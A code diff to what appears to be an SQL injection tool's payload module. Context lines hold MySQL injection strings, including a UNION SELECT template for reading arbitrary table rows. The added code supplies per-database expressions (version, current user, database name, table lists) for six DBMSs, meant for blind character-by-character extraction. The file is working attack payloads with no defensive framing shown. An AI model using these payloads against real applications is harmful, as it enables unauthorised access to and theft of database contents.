@@ -236,7 +236,6 @@ ENUM_PAYLOADS: dict[str, List[str]] = {
         "' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=0-- -",
     ],
     "nth_row": [
-        # Template: call payload.format(offset=N, tbl="table_name", col="column_name")
         "' UNION SELECT {col},NULL FROM {tbl} ORDER BY {col} LIMIT 1 OFFSET {offset}-- -",
     ],
 }
@@ -245,3 +244,69 @@ ENUM_PAYLOADS: dict[str, List[str]] = {
 def get_enum_payloads(category: str) -> List[str]:
     """Return MySQL enumeration payloads for *category*."""
     return ENUM_PAYLOADS.get(category, [])
+
+
+# ---------------------------------------------------------------------------
+# Extraction targets — scalar SQL expressions per DBMS
+# ---------------------------------------------------------------------------
+
+EXTRACTION_TARGETS: dict[str, List[tuple[str, str]]] = {
+    "mysql": [
+        ("version",          "VERSION()"),
+        ("current_user",     "CURRENT_USER()"),
+        ("current_database", "DATABASE()"),
+        ("tables",
+         "(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',')"
+         " FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"),
+    ],
+    "mariadb": [
+        ("version",          "VERSION()"),
+        ("current_user",     "CURRENT_USER()"),
+        ("current_database", "DATABASE()"),
+        ("tables",
+         "(SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',')"
+         " FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"),
+    ],
+    "mssql": [
+        ("version",          "CAST(@@version AS VARCHAR(512))"),
+        ("current_user",     "SYSTEM_USER"),
+        ("current_database", "DB_NAME()"),
+        ("tables",
+         "(SELECT STRING_AGG(table_name,',') FROM information_schema.tables"
+         " WHERE table_type='BASE TABLE')"),
+    ],
+    "postgres": [
+        ("version",          "VERSION()"),
+        ("current_user",     "CURRENT_USER"),
+        ("current_database", "CURRENT_DATABASE()"),
+        ("tables",
+         "(SELECT STRING_AGG(table_name,',' ORDER BY table_name)"
+         " FROM information_schema.tables WHERE table_schema='public')"),
+    ],
+    "sqlite": [
+        ("version", "sqlite_version()"),
+        ("tables",  "(SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table')"),
+    ],
+    "oracle": [
+        ("version",       "(SELECT banner FROM v$version WHERE rownum=1)"),
+        ("current_user",  "(SELECT USER FROM DUAL)"),
+        ("tables",
+         "(SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)"
+         " FROM user_tables)"),
+    ],
+}
+
+_EXTRACTION_TARGETS_GENERIC: List[tuple[str, str]] = [
+    ("version",      "VERSION()"),
+    ("current_user", "CURRENT_USER"),
+]
+
+
+def get_extraction_targets(dbms: str) -> List[tuple[str, str]]:
+    """Return a list of (label, sql_expr) pairs to extract for *dbms*.
+
+    Each expression is a scalar SQL expression returning a single string value,
+    suitable for char-by-char extraction via ASCII(SUBSTRING(expr, pos, 1)).
+    Ordered cheapest/most-useful first.
+    """
+    return EXTRACTION_TARGETS.get((dbms or "").lower(), _EXTRACTION_TARGETS_GENERIC)
